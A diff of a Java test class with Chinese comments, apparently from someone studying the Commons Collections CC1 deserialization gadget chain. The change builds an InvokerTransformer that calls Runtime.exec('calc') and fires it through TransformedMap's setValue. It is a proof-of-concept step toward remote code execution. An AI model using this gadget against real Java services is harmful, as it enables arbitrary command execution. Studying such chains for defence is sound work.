@@ -51,18 +51,20 @@ public class TestCC01 {
     public void testTranformMapWithcheckSetValue() {
         //构造TransformedMap.decorate方法的参数
         Map map=new HashMap();
+        map.put("key","value");
         //构造keyTransformer参数,keyTransformer是InvokerTransformer的实例化的对象
         Runtime runtime = Runtime.getRuntime();
         String MethodName="exec";
         Class[] paramTypes=new Class[]{String.class};
         Object[] arg=new Object[]{"calc"};
         InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);
+
         //调用decorate方法，传入参数
-        Map tranformedmap = TransformedMap.decorate(map,  invokerTransformer,null);
+        Map<Object,Object> tranformedmap = TransformedMap.decorate(map,null,invokerTransformer);
 
-        //调用tranformedmap的put方法
-        tranformedmap.put(runtime,"value") ;
-
+        for (Map.Entry entry:tranformedmap.entrySet()){
+            entry.setValue(runtime);
+        }
     }
     //下面这个测试类是上面的简化版本
     @Test
